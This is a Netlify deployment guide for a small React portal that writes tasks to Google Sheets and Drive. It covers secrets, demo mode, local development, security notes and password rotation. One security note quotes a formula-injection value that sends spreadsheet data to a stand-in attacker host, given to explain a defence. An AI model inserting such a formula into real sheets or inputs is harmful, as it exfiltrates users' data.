# Netlify Deployment Guide

The portal is a React + TypeScript frontend built into `dist/`, plus two Netlify
Functions in `netlify/functions/`. There is no long-running server.

| Path | Function | Method |
| --- | --- | --- |
| `/api/create-task` | `netlify/functions/create-task.mjs` | POST |
| `/api/tasks` | `netlify/functions/tasks.mjs` | GET |

Both require the shared portal password in an `X-Portal-Password` header.

## 1. Generate a portal password

```powershell
node -e "console.log(require('crypto').randomBytes(24).toString('base64url'))"
```

Must be at least 12 characters. The API returns 503 to every request if it is
unset or shorter, so the portal can never accidentally run unprotected.

## 2. Set environment variables in Netlify

**Site configuration → Environment variables.** Never commit these.

| Variable | Notes |
| --- | --- |
| `PORTAL_PASSWORD` | From step 1. Share with the team out of band. |
| `GOOGLE_CLIENT_EMAIL` | Service account email. |
| `GOOGLE_PRIVATE_KEY` | Paste the whole key including `-----BEGIN PRIVATE KEY-----`. Netlify preserves `\n` escapes; the code converts them. |
| `GOOGLE_SHEET_ID` | Target spreadsheet. |
| `GOOGLE_DRIVE_PARENT_FOLDER_ID` | Parent folder for new project folders. |
| `WDS_INTRO_DOC_ID` | Optional. Intro slides to copy. |
| `TELEGRAM_BOT_TOKEN` | Optional. Omit to disable notifications. |
| `TELEGRAM_CHAT_ID` | Optional. |

Scope them to **all deploy contexts**, or production only if you do not want
deploy previews touching the live Sheet. Deploy previews get public URLs, so
prefer scoping secrets to production only.

> ⚠️ **Never set `DEMO_MODE` in the production context.** It switches the API over
> to the fictional fixtures in `fixtures/tasks.demo.json` and drops the password
> check, so both functions refuse every request with `503` if they find it set in
> production. That is deliberate: showing volunteers fake data silently would be
> worse than an outage. It is safe in a branch or deploy-preview context if you
> ever want a shareable demo, and useful there: a preview with `DEMO_MODE=1` needs
> no Google credentials at all. Such a demo is read-only — creating a task reports
> that and changes nothing — because each deployed function has its own container.
> See [CONTRIBUTING.md](CONTRIBUTING.md).

## 3. Deploy

Connect the GitHub repo at <https://app.netlify.com/start>. `netlify.toml`
already sets everything:

- build command: `npm run build`
- publish directory: `dist`
- functions directory: `netlify/functions`
- Node version: 22

Netlify installs dependencies, runs the Vite build, and bundles the functions
automatically.

## 4. Local development

```powershell
npm install
npm install -g netlify-cli   # once
cp .env.example .env         # then fill it in
npm run dev                  # http://localhost:8888
```

`netlify dev` runs the Vite frontend and functions together and applies the
`/api/*` rewrites, so local behaviour matches production. Always use
`npm run dev`; the frontend-only Vite server cannot reach the local API.

## 5. Security notes

- **Rotate any secret that has ever been committed.** Git history was scanned
  and is clean, but rotate on any doubt.
- **The Drive scope is broad.** The service account uses the full
  `auth/drive` scope because it copies `WDS_INTRO_DOC_ID` and writes into an
  existing parent folder. To limit the blast radius, give this service account
  its own Google account or shared drive containing only the parent folder and
  the intro doc — not access to the whole team drive.
- **Sheet writes use `valueInputOption: 'RAW'`.** This stores user input as
  literal text so a task name like `=IMPORTDATA("https://evil.tld/?"&A1)`
  cannot execute as a formula. If you later export the sheet to CSV and open it
  in Excel, apply the usual CSV-injection care — Excel re-parses leading `=`.
- **The password is a single shared credential.** There is no per-user audit
  trail and no revocation short of rotating it for everybody. See below.
- **Rate limiting is not implemented.** Netlify Functions are stateless, so an
  in-memory limiter would not work reliably across instances. The password is
  the only thing standing between the public internet and your Google quota.
  If the URL leaks, rotate immediately. For real limits use Netlify Rate
  Limiting (paid) or move the counter to an external store.
- **Run `npm audit --omit=dev` before each deploy.** Currently clean.

## 6. Rotating the portal password

Rotate when someone leaves the team, when the password may have been shared
outside it, or if the site URL becomes public. There is one shared credential,
so rotation logs everybody out at once — expect to re-share it immediately.

1. Generate a new value (step 1 above).
2. **Site configuration → Environment variables →** edit `PORTAL_PASSWORD`.
3. **Trigger a redeploy.** Functions read environment variables at invocation,
   but Netlify does not re-run them on a variable change alone. Until you
   redeploy, the old password keeps working.
4. Confirm the new password unlocks the portal and the old one returns `401`.
5. Share the new password with the team out of band — not in the repository, not
   in the Telegram channel the bot posts to.

Everyone's browser tab holds the old password in `sessionStorage`. They will be
re-prompted on the next request that returns `401`, or when they close the tab.

If you are rotating because the password leaked, also check the `Tasks` sheet for
rows you do not recognise, and the Drive parent folder for unexpected
`Project - …` folders.
